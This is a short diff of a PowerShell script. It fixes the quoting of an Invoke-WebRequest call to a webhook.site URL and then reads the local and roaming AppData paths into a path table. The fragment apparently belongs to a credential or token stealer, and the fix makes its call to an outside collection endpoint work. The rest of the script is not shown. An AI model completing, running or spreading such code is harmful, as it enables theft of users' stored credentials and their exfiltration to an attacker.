@@ -1,4 +1,4 @@
-Invoke-WebRequest("https://webhook.site/34758d6a-587f-4434-bbb9-1d848b896f20)
+Invoke-WebRequest("https://webhook.site/34758d6a-587f-4434-bbb9-1d848b896f20")
 $LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
 $PATHS = @{
